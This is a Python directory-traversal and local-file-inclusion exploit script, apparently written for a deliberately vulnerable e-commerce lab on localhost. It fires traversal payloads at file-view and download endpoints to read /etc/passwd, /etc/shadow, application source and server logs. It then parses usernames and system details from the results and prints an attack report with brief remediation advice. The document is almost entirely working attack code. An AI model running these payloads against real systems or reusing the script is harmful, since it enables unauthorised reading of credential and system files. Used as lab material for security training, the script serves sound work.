#!/usr/bin/env python3
"""
Directory Traversal / Local File Inclusion (LFI) Exploitation Script
Tests the vulnerable file viewing endpoints for directory traversal attacks.
"""

import requests
import sys
import urllib.parse
from typing import Dict, List, Any

class DirectoryTraversalTester:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def test_lfi_vulnerability(self):
        """Test Local File Inclusion vulnerability"""
        print("[*] Testing Local File Inclusion (LFI) vulnerability...")
        
        # Common LFI payloads
        payloads = [
            "../../../etc/passwd",
            "../../../../etc/passwd", 
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../etc/shadow",
            "../../../etc/hosts",
            "../../../proc/version",
            "../../../proc/cpuinfo",
            "../../../proc/meminfo",
            "/etc/passwd",
            "/etc/shadow",
            "/proc/version",
            "../app.py",
            "../../app.py",
            "../../../app.py",
            "/etc/apache2/apache2.conf",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/www/html/index.html"
        ]
        
        successful_reads = []
        
        for payload in payloads:
            # URL encode the payload
            encoded_payload = urllib.parse.quote(payload)
            url = f"{self.base_url}/view_file?file={encoded_payload}"
            
            try:
                response = self.session.get(url)
                
                if response.status_code == 200 and "Error:" not in response.text:
                    # Check for successful file read indicators
                    content_indicators = [
                        "root:", "/bin/bash", "/sbin/nologin",  # /etc/passwd
                        "root:x:", "daemon:x:",                # /etc/passwd
                        "Linux version", "kernel",             # /proc/version
                        "127.0.0.1", "localhost",             # /etc/hosts
                        "processor", "cpu family",            # /proc/cpuinfo
                        "from flask import",                   # app.py
                        "<!DOCTYPE html>", "<html>"           # HTML files
                    ]
                    
                    response_lower = response.text.lower()
                    if any(indicator.lower() in response_lower for indicator in content_indicators):
                        successful_reads.append({
                            'payload': payload,
                            'url': url,
                            'content_preview': response.text[:200] + "..." if len(response.text) > 200 else response.text
                        })
                        print(f"[+] SUCCESS: {payload}")
                        newline_char = '\\n'
                        preview_text = response.text[:100].replace(newline_char, ' ')
                        print(f"    Preview: {preview_text}...")
                    else:
                        print(f"[-] No readable content: {payload}")
                else:
                    print(f"[-] Failed: {payload} (Status: {response.status_code})")
                    
            except Exception as e:
                print(f"[!] Error testing {payload}: {e}")
        
        return successful_reads
    
    def test_download_endpoint(self):
        """Test directory traversal in download endpoint"""
        print("\\n[*] Testing directory traversal in download endpoint...")
        
        payloads = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../app.py",
            "../../app.py",
            "../../../proc/version",
            "../requirements.txt"
        ]
        
        successful_downloads = []
        
        for payload in payloads:
            url = f"{self.base_url}/download/{payload}"
            
            try:
                response = self.session.get(url)
                
                if response.status_code == 200 and "Error:" not in response.text:
                    successful_downloads.append({
                        'payload': payload,
                        'url': url,
                        'content_type': response.headers.get('content-type', 'Unknown'),
                        'content_length': len(response.content)
                    })
                    print(f"[+] Downloaded: {payload} ({len(response.content)} bytes)")
                else:
                    print(f"[-] Failed: {payload}")
                    
            except Exception as e:
                print(f"[!] Error: {e}")
        
        return successful_downloads
    
    def extract_sensitive_info(self, successful_reads: List[Dict[str, Any]]) -> Dict[str, List[str]]:
        """Extract sensitive information from successfully read files"""
        print("\\n[*] Extracting sensitive information...")
        
        sensitive_info: Dict[str, List[str]] = {
            'users': [],
            'system_info': [],
            'application_info': [],
            'network_info': []
        }
        
        for read_result in successful_reads:
            content = read_result['content_preview'].lower()
            
            # Extract user information from /etc/passwd
            if 'root:' in content or '/bin/bash' in content:
                print(f"[+] Found system users in: {read_result['payload']}")
                # Extract usernames (basic parsing)
                lines = read_result['content_preview'].split('\\n')
                for line in lines:
                    if ':' in line and not line.startswith('#'):
                        username = line.split(':')[0]
                        if username:
                            sensitive_info['users'].append(username)
            
            # Extract system information
            if 'linux version' in content or 'kernel' in content:
                print(f"[+] Found system information in: {read_result['payload']}")
                sensitive_info['system_info'].append(read_result['content_preview'])
            
            # Extract application information
            if 'flask' in content or 'import' in content or 'def' in content:
                print(f"[+] Found application code in: {read_result['payload']}")
                sensitive_info['application_info'].append(read_result['payload'])
            
            # Extract network information
            if 'localhost' in content or '127.0.0.1' in content:
                print(f"[+] Found network configuration in: {read_result['payload']}")
                sensitive_info['network_info'].append(read_result['content_preview'])
        
        return sensitive_info
    
    def generate_report(self, successful_reads, successful_downloads, sensitive_info):
        """Generate comprehensive report"""
        print("\\n" + "="*60)
        print("DIRECTORY TRAVERSAL VULNERABILITY REPORT")
        print("="*60)
        
        print(f"\\nSUCCESSFUL LFI ATTACKS: {len(successful_reads)}")
        for result in successful_reads:
            print(f"  • {result['payload']}")
        
        print(f"\\nSUCCESSFUL DOWNLOAD ATTACKS: {len(successful_downloads)}")
        for result in successful_downloads:
            print(f"  • {result['payload']} ({result['content_length']} bytes)")
        
        print("\\nSENSITIVE INFORMATION DISCOVERED:")
        users_data = sensitive_info.get('users', [])
        if users_data:
            users_list = list(set(users_data))
            print(f"  • System Users: {len(users_list)}")
            print(f"    {', '.join(users_list[:10])}")
        
        app_info = sensitive_info.get('application_info', [])
        if app_info:
            print(f"  • Application Files: {len(app_info)}")
            print(f"    {', '.join(app_info)}")
        
        print("\\nSECURITY IMPACT:")
        print("  • System file access")
        print("  • Application source code exposure")
        print("  • Configuration file access")
        print("  • Potential credential exposure")
        print("  • Information gathering for further attacks")
        
        print("\\nRECOMMENDATIONS:")
        print("  • Implement proper input validation")
        print("  • Use whitelist approach for file access")
        print("  • Sanitize file paths")
        print("  • Run application with minimal privileges")
        print("  • Implement proper access controls")

def main():
    print("="*60)
    print("Directory Traversal / LFI Testing Tool")
    print("Target: Vulnerable E-Commerce Lab")
    print("="*60)
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:5000"
    
    tester = DirectoryTraversalTester(base_url)
    
    # Test LFI vulnerability
    successful_reads = tester.test_lfi_vulnerability()
    
    # Test download endpoint
    successful_downloads = tester.test_download_endpoint()
    
    # Extract sensitive information
    sensitive_info = tester.extract_sensitive_info(successful_reads)
    
    # Generate report
    tester.generate_report(successful_reads, successful_downloads, sensitive_info)
    
    print("\\n" + "="*60)
    print("Directory Traversal testing complete!")
    print("="*60)

if __name__ == "__main__":
    main()
